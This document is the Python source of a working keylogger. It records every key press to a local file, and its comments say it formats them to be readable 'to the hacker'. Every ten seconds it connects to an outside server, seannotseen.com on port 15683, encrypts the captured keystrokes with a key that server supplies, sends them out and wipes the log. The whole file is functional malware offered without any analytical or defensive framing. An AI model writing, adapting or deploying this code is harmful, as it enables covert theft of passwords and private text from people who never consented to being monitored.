import keyboard
import asyncio
import socket
from cryptography.fernet import Fernet


log_file = open('keystrokes.txt', 'w')
# opens the file to write

# essentially, this formats the text in a way that makes it readable to the hacker
def on_key_press(event):
    if event.name == 'enter':
        log_file.write('\n')
    elif event.name == 'space':
        log_file.write(' ')
    elif event.name == 'backspace':
        size = log_file.tell()
        log_file.truncate(size - 1)
    elif event.name == '?' or event.name == '.' or event.name == '!':
        log_file.write(event.name + '\n')
    elif event.name == 'alttab' or event.name == 'tab':
        pass
    elif event.name == 'shift' or event.name == 'right shift':
        pass
    else:
        log_file.write(event.name)
    log_file.flush()

# every ten seconds, do this following block of code:
async def main():
    while True:
        await asyncio.sleep(10)
        # This is client's code

        # Define the server's IP address and port
        server_ip = 'seannotseen.com'
        server_port = 15683

        # Create a socket object
        client_socket = socket.socket()

        # Connect to the server
        client_socket.connect((server_ip, server_port))

        key = client_socket.recv(1024)

        cipher_suite = Fernet(key)

        # Encrypt a message and send it to the server
        with open("keystrokes.txt", 'r') as file:
            message = file.read()

        encrypted_message = cipher_suite.encrypt(message.encode())

        client_socket.send(encrypted_message)

        # Close the client socket
        client_socket.close()
        log_file.truncate(0)

# then, make an event listener, and run the main file chunk of code.
keyboard.on_press(on_key_press)

asyncio.run(main())